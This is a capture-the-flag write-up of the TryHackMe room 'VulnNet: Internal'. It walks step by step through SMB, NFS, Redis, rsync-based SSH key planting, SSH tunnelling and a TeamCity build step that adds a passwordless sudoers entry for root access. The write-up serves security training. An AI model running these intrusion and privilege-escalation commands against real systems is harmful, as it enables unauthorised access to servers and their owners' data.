## Machine Information

![internal](/assets/images/2021-05-27-17-14-03.png)

VulnNet: Internal is an easy difficulty room on TryHackMe. Our initial scan reveals a lot of open ports, and this server presents us with an interesting walk through of a selection of different services. We follow a path through smb, nfs, redis, rsync, ssh and finally use an application called TeamCity to perform command execution to escalate our shell to root.

<!--more-->

Skills required are basic file and operating system enumeration and exploration knowledge. Skills gained are tools and techniques to exploit a variety of misconfigured services.

## Initial Recon

As always let's start with Nmap:

Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds
```

We see from the scan there are a lot of open ports. Let's first add the server IP to our hosts file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# echo 10.10.172.1 internal.thm >> /etc/hosts
```

## SMB

Let's start with SMB on port 445. I like to use smbmap because it can recursively scan sub folders and list contents which saves time. First we look what is open:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# smbmap -H internal.thm                               
[+] Guest session       IP: internal.thm:445    Name: unknown                                           
        Disk             Permissions     Comment
        ----             -----------     -------
        print$           NO ACCESS       Printer Drivers
        shares           READ ONLY       VulnNet Business Shares
        IPC$             NO ACCESS       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

A suspicious share called **shares** which we have read access to, let's have a look at it:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# smbmap -H internal.thm -u root -R                     
[+] Guest session       IP: internal.thm:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares

```

We see a couple of folders with files in them. Let's use smbget to download them all at once:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# smbget -R smb://internal.thm/shares
Password for [root] connecting to //shares/internal.thm: 
Using workgroup WORKGROUP, user root
smb://internal.thm/shares/temp/services.txt
smb://internal.thm/shares/data/data.txt
smb://internal.thm/shares/data/business-req.txt
Downloaded 276b in 1 seconds
```

Let's see what we have, first the services text file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# cat temp/services.txt                   
THM{HIDDEN}
```

We have our first flag. Let's have a look at the other files:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# cat data/data.txt 
Purge regularly data that is not needed anymore

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# cat data/business-req.txt 
We just wanted to remind you that weâ€™re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

## NFS

Ok. Those are not as interesting. We also have NFS on port 2049, let's have a look at that one:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# showmount -e internal.thm          
Export list for internal.thm:
/opt/conf *
```

We have an NFS export available, let's mount it and see what's inside:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# cd /tmp

â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# mkdir pencer

â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# mount -t nfs internal.thm:/opt/conf pencer

â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# cd pencer

â”Œâ”€â”€(rootðŸ’€kali)-[/tmp/pencer]
â””â”€# ls -lsa
total 36
4 drwxr-xr-x  9 root root 4096 Feb  2 11:19 .
4 drwxrwxrwt 15 root root 4096 May 24 22:33 ..

4 drwxr-xr-x  2 root root 4096 Feb  2 09:36 opt

4 drwxr-xr-x  2 root root 4096 Feb  2 09:38 wildmidi
```

A number of folders are accessible. Before enumerating them manually for interesting content I usually do a few recursive grep searches for obvious things like users and passwords:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[/tmp/pencer]
â””â”€# grep -R user
vim/vimrc:" Vim will load $VIMRUNTIME/defaults.vim if the user does not have a vimrc.
redis/redis.conf:# This will make the user aware (in a hard way) that data is not persisting

redis/redis.conf:# a good idea. Most users should use the default of 10 and raise this up to
init/lightdm.conf:          # Single-user mode
```

Nothing useful for the user search, but searching for **pass** looks to have revealed something interesting:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[/tmp/pencer]
â””â”€# grep -R pass                                                                             
redis/redis.conf:# 2) No password is configured.

redis/redis.conf:# 150k passwords per second against a good box. This means that you should
redis/redis.conf:# use a very strong password otherwise it will be very easy to break.
redis/redis.conf:# requirepass foobared
```

## Redis

We've found a password in the redis.conf file. Looking back at the nmap scan we see there is redis on port 6379:

```text
6379/tcp  open     redis       Redis key-value store
```

So this is possibly the intended path for us to progress with. First though, what is Redis?

A search found plenty of information. It's available on Amazon, and [this page](https://aws.amazon.com/redis/) describes it nicely:

```text
Redis, which stands for Remote Dictionary Server, is a fast, open-source, in-memory key-value data store for use as a database, cache, message broker, and queue.
Redis now delivers sub-millisecond response times enabling millions of requests per second for real-time applications in Gaming, Ad-Tech, Financial Services, Healthcare, and IoT.
Redis is a popular choice for caching, session management, gaming, leaderboards, real-time analytics, geospatial, ride-hailing, chat/messaging, media streaming, and pub/sub apps.
```

Ok, sounds interesting, but how do we access it?

Another search found [this](https://www.tutorialspoint.com/redis/redis_commands.htm) useful tutorial, which shows you how to use redis-cli to access the instance. Although this client isn't installed by default in Kali, you can get it to prompt and install it for you:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]

```

Right, now we have the client let's try and connect with the password we found before:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# redis-cli -h internal.thm -a <HIDDEN>
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
internal.thm:6379>
```

Excellent, the password worked and we're connected to the redis server. We can use the command **info** to look at the server config:

```text
internal.thm:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0

<SNIP>

# Keyspace
db0:keys=5,expires=0,avg_ttl=0
```

The output is quite long, but the bit that we are interested in is at the end. Keyspace is a bit like database or a key-value pair. We see there are 5 let's have a look at them:

```text
internal.thm:6379> keys *
1) "authlist"
2) "marketlist"
3) "internal flag"
4) "tmp"
5) "int"
```

My eyes are drawn to number three, let's see what data type it is:

```text
internal.thm:6379> type "internal flag"
string
```

We can use the **get** command to retrieve the string held in this key:

```text
internal.thm:6379> get "internal flag"
"THM{<HIDDEN>}"
```

Ok, moving on let's look at the other keys:

```text
internal.thm:6379> type authlist
list
```

This key is a list instead of a string, we can view the contents of it using the ltrace command:

```text
internal.thm:6379> lrange authlist 1 9999999
1) "QXV0aG9yaXphdGlvbi<HIDDEN>hjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbi<HIDDEN>hjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbi<HIDDEN>hjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

The same string repeated three times. The == on the end tells us it is probably base64 encoded, let's try and decode it:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# echo "QXV0aG9yaXphdGlvbi<HIDDEN>hjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password <HIDDEN>
```

## Rsync

I checked the other keys but there was nothing else of interest. Looks like our next move is to rsync, and looking back at the nmap scan we see it's open and ready for us:

```text
873/tcp   open     rsync       (protocol version 31)
```

What is rsync? A search finds [this](https://www.cyberciti.biz/faq/show-progress-during-file-transfer/) helpful guide:

```text
rsync is free and open source tool. It is useful to copy local or remote file. It reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination.
```

So you can use rsync to mirror files between a source and destination. You can also use it to browse the backup like a file share. Let's have a look:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/                                    
files           Necessary home interaction
```

There is a folder being synced called files, we can look inside it using the password we found earlier:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/files                
Password: 
drwxr-xr-x          4,096 2021/02/01 12:51:14 .
drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/files/sys-internal/

```

Lot's of folders to look through, first let's get the user flag:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/files/sys-internal/user.txt user.txt
Password: 

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# cat user.txt             
THM{<HIDDEN>}
```

I looked around the folders a little but nothing stood out apart from the .ssh one, but inside it's empty:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2021/02/06 11:43:14 .
```

## SSH

However, rsync is a two way tool. I can push files to the server as well as pull them to Kali. So next step is to create a new SSH key:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# ssh-keygen               
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/thm/internal/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/thm/internal/id_rsa
Your public key has been saved in /root/thm/internal/id_rsa.pub
The key fingerprint is:
SHA256:cI/9dSTfuwtDuaZl40evsmEpsIsd1P1bG+Bvq+ut1Yo root@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|      . .     . .|
|       o = .  .+.|
|        S + .+. +|
|       . o .o+ooo|
|        o . =Xo++|
|       o o oBoB*=|
|      . o  .EOXOo|
+----[SHA256]-----+
```

Next we use rsync to put it in that .ssh folder:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync id_rsa.pub rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/authorized_keys
Password:

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# rsync rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/                              
Password: 
drwxrwxr-x          4,096 2021/05/26 21:04:04 .
-rw-r--r--            563 2021/05/26 21:04:04 authorized_keys
```

That worked and we can see our file is in there. Now we can connect using our private key:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# ssh sys-internal@internal.thm -i id_rsa
The authenticity of host 'internal.thm (10.10.36.221)' can't be established.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

sys-internal@vulnnet-internal:~$ 
```

## TeamCity

A quick look around finds an unusual folder at the root of the drive called TeamCity:

```text
sys-internal@vulnnet-internal:/TeamCity$ ls -la
total 76
drwxr-xr-x 12 root root  4096 Feb  6 13:30 .

drwxr-x---  3 root root  4096 Feb  6 13:30 work
sys-internal@vulnnet-internal:/TeamCity$
```

A look at the readme gives us a clue at the next step:

```text
sys-internal@vulnnet-internal:/TeamCity$ cat TeamCity-readme.txt
This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

TeamCity product page: https://www.jetbrains.com/teamcity/sys-internal@vulnnet-internal:/TeamCity$ 
```

It says on Linux the application is accesible from the localhost on port 8111. There was no netstat so I used [this article](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/) for different ways to check:

```text
sys-internal@vulnnet-internal:/TeamCity$ ss -tulpn | grep 8111
tcp   LISTEN  0       100       [::ffff:127.0.0.1]:8111                 *:* 
```

We can confirm something is listening on port 8111 on the loopback address.

A further look around the TeamCity area found a file called catalina.out in the logs subfolder. Grepping that for port 8111 reveals two interesting things:

```text
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: <HIDDEN> (use empty username with the token as the password to access the server)
```

Firstly we need a web browser to access the TeamCity application URL which we can't do from this ssh session. Instead we can use port forwarding to pass our local Kali web browser traffic through ssh and on to port 8111 on the target server. I've covered tunneling over ssh few times already. See [GameZone](https://pencer.io/ctf/ctf-thm-game-zone), [Internal](https://pencer.io/ctf/ctf-thm-internal) and [Wreath](https://pencer.io/ctf/ctf-thm-wreath) for other examples if you need them.

Secondly we have a super user token which it says can be used instead of a username and password. Nice!

## SSH Tunneling

Let's set up our tunnel:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# ssh sys-internal@internal.thm -i id_rsa -L 8111:127.0.0.1:8111
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

Last login: Wed May 26 22:53:41 2021 from 10.8.165.116
sys-internal@vulnnet-internal:~$ 
```

Now switch back to Kali and set up a proxy in Firefox. I use [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) for this as it's nice and simple:

![vulnet-internal-foxy](/assets/images/2021-05-26-21-56-17.png)

We can now use Firefox on Kali to get to port 8111 on the target:

![vulnet-internal-teamcity](/assets/images/2021-05-26-21-57-21.png)

I tried each of the tokens in order, as you'd expect it was the last one that worked!

![vulnet-internal-login](/assets/images/2021-05-26-22-11-33.png)

With super user access to the application, we can assume we'll be using those privileges to gain root access to the server. Clicking the create project button takes me here:

![vulnet-internal-build](/assets/images/2021-05-26-22-17-32.png)

I've clicked on Manually, then filled in the fields and clicked Create. Then I clicked on Build Configuration and filled that in:

![vulnet-internal-config](/assets/images/2021-05-26-22-22-41.png)

After clicking create on this one we're back at the settings page for our project. Now click on Build Steps:

![vulnet-internal-buildconfig](/assets/images/2021-05-26-22-26-26.png)

## Sudoers

We put our code in the custom script section. I'll use this to add our user to the sudoers file:

```text
echo "sys-internal  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal
```

Click save and then run will cause the application to run the command with admin privileges:

![vulnet-internal-addsudo](/assets/images/2021-05-26-22-33-59.png)

Now we can switch user to root and get the last flag:

```text
sys-internal@vulnnet-internal:/TeamCity/logs$ sudo su
root@vulnnet-internal:/TeamCity/logs# cat /root/root.txt
THM{<HIDDEN>}
```

We are all done. See you next time.
